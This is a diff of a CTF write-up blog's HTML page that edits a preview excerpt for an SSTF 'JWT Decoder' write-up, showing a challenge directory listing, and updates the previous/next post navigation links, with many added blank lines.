+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
   
 
   
@@ -1531,28 +1511,12 @@ cat templates/index.html
 
                   I participated in the CTF called sstf after 5 months. Today, I wrote that how to solve a JWT Decoder.
 
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
 ~/Downloads/prob
 ❯ tree -I &quot;node_modules&quot;
 .
-├── D...
+├── Dockerfile
+├── docker-compose.yml
+├── flag.txt...
                 </p>
               </div>
             </div>
@@ -1650,22 +1614,18 @@ Cause I was lazy, I didn’t do ctf for a long time. If i say “cause I was bus
 
   
     <a
-      href="/posts/Trust-CTF/"
+      href="/posts/TFC-CTF-2025/"
       class="btn btn-outline-primary"
       aria-label="Older"
     >
-      <p>Trust CTF 2021 Write Up</p>
+      <p>TFC CTF 2025 Write Up</p>
     </a>
   
 
   
-    <a
-      href="/posts/UTCTF/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>UTCTF 2021 Tar Inspector Write Up</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
